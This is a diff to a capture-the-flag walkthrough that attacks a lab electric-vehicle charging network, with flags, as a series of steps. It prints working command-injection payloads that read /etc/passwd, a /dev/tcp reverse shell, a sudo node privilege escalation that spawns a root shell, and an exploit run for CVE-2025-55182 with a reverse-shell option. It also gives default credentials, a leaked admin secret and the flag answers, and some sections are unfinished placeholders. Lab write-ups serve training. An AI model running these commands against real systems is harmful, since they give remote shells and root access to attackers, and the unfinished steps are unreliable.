@@ -30,17 +30,18 @@
 curl "http://192.168.250.50/api/qr?station=EV-CH-001&format=pdf"
 
 # Exploitation: Command injection via station parameter
-curl "http://192.168.250.50/api/qr?station=EV-CH-001;id&format=png"
+curl "http://192.168.250.50/api/qr?station=EV-CH-001;cat+/etc/passwd;%23&format=png"
 
 # Reverse shell
-curl "http://192.168.250.50/api/qr?station=;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'&format=png"
+bashcurl "http://192.168.250.50/api/qr?station=EV-CH-001;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.125.100/4444+0>%261';%23&format=png"
 ```
 
 **FLAG #1:** `FLAG{qr_c0mm4nd_1nj3ct10n}` — Command Injection RCE
 
 **PrivEsc via backup.js:**
 ```bash
-export BACKUP_TARGET="; bash -p"
+# Find a file with write and execute permissions - backup.js
+echo "require('child_process').exec('/bin/bash -p', {stdio: 'inherit'})" > /opt/maintenance/backup.js
 sudo /usr/bin/node /opt/maintenance/backup.js
 ```
 
@@ -72,11 +73,11 @@ ssh -i id_jumphost operator@192.168.100.40
 
 **Grafana Access (via SSH tunnel):**
 ```bash
-ssh -L 3000:192.168.100.30:3000 operator@192.168.100.40 -N &
+ssh -i /root/.ssh/id_jumphost -L 0.0.0.0:8080:192.168.100.30:3000 operator@192.168.100.40 -N -f
 # Login: admin / admin
 ```
 
-**FLAG #6:** `FLAG{gr4f4n4_d3f4ult_cr3ds}`
+**FLAG #6:** `FLAG{gr4f4n4_d3f4ult_cr3ds}` - dashboard description
 
 ---
 
@@ -86,30 +87,44 @@ ssh -L 3000:192.168.100.30:3000 operator@192.168.100.40 -N &
 
 ```bash
 # CVE-2025-55182 exploitation
-curl -X POST http://192.168.20.20:3000/api/action \
-     -H "Content-Type: text/x-component" \
-     -H "Next-Action: exploit" \
-     -d '{"payload":{"$$bound":[{"$type":"Function","body":"return require(\"child_process\").execSync(\"id\").toString()"}]}}'
+# Clone the repository
+git clone https://github.com/Spritualkb/CVE-2025-55182-exp.git
+cd CVE-2025-55182-exp
+
+# Install dependencies
+pip install requests
+pip install requests[socks]  # For SOCKS5 proxy support
+
+# Check it`s work
+python3 exploit.py http://target:3000 --check
+
+# Blind RCE
+python3 exploit.py http://target:3000 -c "id"
+
+# Reverse Shell
+# Start listener first
+nc -lvnp 4444
+
+# Execute reverse shell
+python3 exploit.py http://target:3000 --revshell 10.0.0.1 4444
 ```
 
 **FLAG #7:** `FLAG{r34ct2sh3ll_csms_pwn3d}` — RCE on CSMS
 
 **Environment extraction:**
 ```bash
-# Read /proc/1/environ → HASURA_ADMIN_SECRET=CitrineOS!
+printenv
 ```
 
 **FLAG #8:** `FLAG{h4sur4_s3cr3t_l34k3d}`
 
 **Database compromise via GraphQL:**
 ```bash
-curl -X POST http://192.168.20.20:8090/v1/graphql \
-     -H "X-Hasura-Admin-Secret: CitrineOS!" \
-     -d '{"query":"{ ctf_flags { flag_value } }"}'
+## ТРЕБА ДОПИСАТИ
 ```
 
 **FLAG #9:** `FLAG{full_csms_c0mpr0m1s3}` — **FINAL FLAG**
-
+## ТРЕБА ДОПИСАТИ
 ---
 
 ## Flags Summary
@@ -123,8 +138,8 @@ curl -X POST http://192.168.20.20:8090/v1/graphql \
 | 5 | `FLAG{jump_h0st_p1v0t}` | SSH Pivot |
 | 6 | `FLAG{gr4f4n4_d3f4ult_cr3ds}` | Default Creds |
 | 7 | `FLAG{r34ct2sh3ll_csms_pwn3d}` | CVE-2025-55182 |
-| 8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | Env Leak |
-| 9 | `FLAG{full_csms_c0mpr0m1s3}` | DB Compromise |
+| 8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | DB Compromise |
+| 9 | `FLAG{full_csms_c0mpr0m1s3}` | FINAL FLAG - Secret Partner or Token |
 
 ---
 
